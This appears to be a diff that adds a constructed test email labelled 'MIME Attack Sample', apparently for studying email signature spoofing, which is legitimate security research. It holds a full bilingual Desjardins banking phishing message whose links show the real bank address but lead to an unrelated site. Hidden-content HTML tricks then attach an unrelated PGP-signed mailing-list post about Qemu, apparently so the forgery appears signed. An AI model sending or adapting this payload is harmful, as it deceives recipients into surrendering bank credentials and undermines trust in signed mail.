@@ -1,0 +1,217 @@
+From: natalie.baker@enron.com
+To: mark.haedicke@enron.com, charles.ward@enron.com, joseph.deffner@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1HcQep-0007id-4c@server.fastbox.info>
+Date: Fri, 13 Apr 2007 13:38:03 -0500
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server.fastbox.info
+X-AntiAbuse: Original Domain - speedy.uwaterloo.ca
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - server.fastbox.info
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: O
+Content-Length: 5798
+Lines: 104
+
+<html>
+
+<head>
+<title>Mouvement Desjardins</title>
+<style type="text/css">
+<!--
+.style1 {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 12px;
+}
+.style2 {
+	font-size: 14px;
+	font-weight: bold;
+}
+.style4 {font-size: 12px}
+-->
+</style>
+</head>
+<table width="777" border="0">
+  <tr>
+    <td width="17"> </td>
+    <td width="750"><TABLE width=750 border=1 align="right" cellPadding=0 cellSpacing=0 bordercolor="e1dcd0">
+      <TBODY>
+        <TR>
+          <TD width=750 bgcolor="efede6"><TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#009966 border=0>
+              <TBODY>
+                <TR>
+                  <TD><IMG 
+src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif"></TD>
+                </TR>
+              </TBODY>
+            </TABLE>
+              <P align="justify"><SPAN class=Estilo6><span class="style2"><FONT color=#009966> Cher(e) membre 
+                Desjardins/ AccsD</FONT></span><FONT lang=0 face=Estilo size=2 
+PTSIZE="10" FAMILY="SANSSERIF"><BR>
+                  <BR>
+                  </FONT><FONT lang=0 
+PTSIZE="10" FAMILY="SANSSERIF"><span class="style1">Desjardins tient  vous signaler que votre dernire transaction n'a pas t automatiquement enregistr d  un nombre elev de transaction simultane. Le dpartement de vrification comptable du Groupe Desjardins  corriger le problme dans les comptes concerns. Si toutefois vous notez une diffrence, nous vous prions de nous en aviser. Si vous constatez une autre erreur, communiquez avec votre institution durant les heures de <a href="http://www.desjardins.com/fr/votre_caisse/index.jsp">votre caisse</a>.</span></FONT></SPAN>
+              <P align="justify"><span class="Estilo6"><font size=3 face="Estilo, Helvetica, sans-serif" class="style1">Pour accder  
+                votre compte et vrifier que tout soit normal, cliquez sur ce lien scuris si dessus :</font></span>
+              <P align="justify"><A 
+href="http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/" target=_blank type=hidden><FONT 
+size=4>https://accesd.desjardins.com/</FONT></A>
+              <p class=style1>Soyez assur que Desjardins met tout en oeuvre pour protger les utilisateurs de ses services Internet </p>
+            <p class=Estilo6><font size=2 face="Arial, Helvetica, sans-serif" class="style1">Le Groupe 
+              Desjardins vous remercie de votre clientle et apprcie votre comprhension.</font></p>
+            <p class=Estilo6><STRONG><FONT face="Estilo, Helvetica, sans-serif" color=#009966 
+size=2>Desjardins / AccsD</FONT></STRONG><BR>
+                  <FONT size=2>Conjuguer avoirs et 
+                    tres 
+                </FONT></p>
+            <TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#009966 border=0>
+                <TBODY>
+                  <TR>
+                    <TD><IMG 
+src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif"></TD>
+                  </TR>
+                </TBODY>
+              </TABLE>
+            <p><span class="style2"><FONT color=#009966>Dear Desjardins Member</FONT></span></p>
+            <P align="justify" class="style1">The Group Desjardins would like to inform you that your last transaction was not automatically recorded due to a high number of simultaneous transactions. Desjardins audit department corrected the problem in the accounts concerned. However if you notice a difference in your folio, we ask you to advise us by communicating with your institution during <a href="http://www.desjardins.com/fr/votre_caisse/index.jsp">opening hours</a>
+              <P align="justify"><span class="style1">We encourage you to    connect to your account and verify your transactions, by clicking the secured url below :<br>
+                    <BR>
+                </span><span class="style4"><A 
+href="http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/" target=_blank type=hidden><FONT 
+size=4>https://accesd.desjardins.com/</FONT></A></span><span class="style1"> </span>
+              <P class=style1>Be assured that Desjardins makes every effort to protect our internet users </P>
+            <P class=style1>The Group Desjardins  thanks you for your business and appreciates your comprehension</P>
+            <P class=Estilo6><STRONG><FONT face="Estilo, Helvetica, sans-serif" color=#009966 
+size=2><br>
+              Desjardins / AccsD</FONT></STRONG><BR>
+              <FONT size=2>Money working for people </FONT></P>
+            <P><FONT face="Estilo, Helvetica,
+sans-serif" size=2><FONT color=#999999 
+size=1>Svp ne rpondez pas  ce courriel car c'est seulement un avis. Le courrier envoy  cette adresse ne peut pas tre rpondu. 
+              </FONT></FONT></P>
+            <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+                <TBODY>
+                  <TR>
+                    <TD width=5></TD>
+                    <TD class="footerText Estilo2" vAlign=bottom align=left><P class=style1>Copyright  2006 Mouvement des caisses Desjardins. Tous droits 
+                      rservs.</P></TD>
+                    <TD align=right><P><SPAN class=bodyText></FONT></SPAN> </P></TD>
+                  </TR>
+                  <TR>
+                    <TD width=5></TD>
+                    <TD class=Estilo5 colSpan=2></TD>
+                  </TR>
+                </TBODY>
+            </TABLE>
+            <P><FONT face="Estilo, Helvetica,
+sans-serif" size=2><FONT color=#999999 
+size=1></FONT></FONT><img src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/securite.gif" border="0" width="140" height="39"></P></TD>
+        </TR>
+      </TBODY>
+    </TABLE></td>
+  </tr>
+</table>
+</P>
+</body>
+
+</html>
+
+
+
+<style>fieldset, br{display: none;}</style>
+<div style="display: none;"><plaintext>
+--DELIMITER
+Content-Type: multipart/signed; boundary="BOUNDARY"; protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA512
+
+Hi Zachary. Have you tried booting anything virtually using Qemu under Linux? The last time I tried this by booting the test image I got no output, since Qemu was using SDL. I'm wondering if 
+this is still the case if I were to say, try and boot an OpenBSD iso or something.
+On Thu, Jun 21, 2007 at 01:48:41PM -0700, Gregory Nowak wrote:
+> -----BEGIN PGP SIGNED MESSAGE-----
+> Hash: SHA1
+> 
+> Thanks for that. I did forget to mention that I tried to have the
+> cdrom as the second drive from an iso, but I didn't try booting from
+> it. I actually wanted to see first how a windows/dos boot floppy would do,
+> thus the floppy boot, but I might bite the bullet, and try booting a
+> debian install iso directly. Also, my purpose in keeping wineyes
+> running was to have access to the qemu monitor, though it sounds like
+> you're saying that won't be accessible, which is too bad. 
+> 
+> I may try it again, though it probably won't be soon. Thanks also for
+> your offer of answering additional questions, I may take you up on
+> that if I need to when I try this again.
+> 
+> Greg
+> 
+> 
+> On Thu, Jun 21, 2007 at 01:25:26PM -0700, Zachary Kline wrote:
+> > Hiya,
+> >     I'll be glad to show you how I run Qemu under Windows.  I warn you that 
+> > Window-Eyes will be of no help whatsoever in reading the Qemu console 
+> > window.  In fact, I suggest either creating a custom set file for it and 
+> > using the Hotkeys option in the general menu to turn them off, or just 
+> > unloading WE entirely.  That, of course, isn't very convenient.  If you turn 
+> > off hotkeys in qemu alone you'll get response when alt+tab is pressed to get 
+> > you out of that window.  Anyway, here's what I do:
+> > To start with, I haven't installed Qemu into c:\program files.  I just did 
+> > C:\qemu,, with the bios in the same place.  So to get that option I do -L ., 
+> > which like under Unix stands for current directory.
+> > A sample command line is:
+> > qemu -serial com3 -boot d -net tap,ifname="tap" -net 
+> > nic,model=rtl8139 -soundhw ens1370 -hda debian.img -cdrom debian.iso -L .
+> > This is what I used to get Debian installed, with the Dectalk express 
+> > connected to a USB-to-serial converter which acted as COM3 under Windows. 
+> > It will work as ttyS0 under Linux, of course.
+> > The boot d option is just to specify booting from the ISO image.  I 
+> > personally haven't done much with floppy images or actual drives.
+> > Once Qemu runs, you'll possibly get a Windows properties dialogue asking 
+> > about whichever COM port you used.  Just hit enter to close it and you'll be 
+> > in a Qemu console window.  Type the command to get speakup up and running, 
+> > in the case of a Debian install it would be:
+> > speakup speakup_synth=dectlk speakup_ser=0
+> > From that point, assuming you unloaded WE or created a set file properly, 
+> > things will just run as normal.  You can alt+tab out of the Qemu window at 
+> > any time.
+> > Hope this helps some.
+> > Thanks,
+> > Zack.
+> > PS: If not, please feel free to ask me anything you'd like.
+> > 
+> > 
+> > _______________________________________________
+> > Speakup mailing list
+> > Speakup@braille.uwo.ca
+> > http://speech.braille.uwo.ca/mailman/listinfo/speakup
+> 
+> - -- 
+> web site: http://www.romuald.net.eu.org
+> gpg public key: http://www.romuald.net.eu.org/pubkey.asc
+> skype: gregn1
+> (authorization required, add me to your contacts list first)
+> 
+> - --
+> Free domains: http://www.eu.org/ or mail dns-manager@EU.org
+> -BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+> Version: GnuPG v1.4.6 (GNU/Linux)
+> 
+> iD8DBQFGeuQp7s9z/XlyUyARAh3DAJ9nyqurzSP5FEyZpmvagW1JN11bZwCfbcsF
+> hUXeI0oUm/5xoGkrcoH2bNo=
+> =qGLd
+> -----END PGP SIGNATURE-----
+> 
+> 
+--BOUNDARY--
+--DELIMITER--
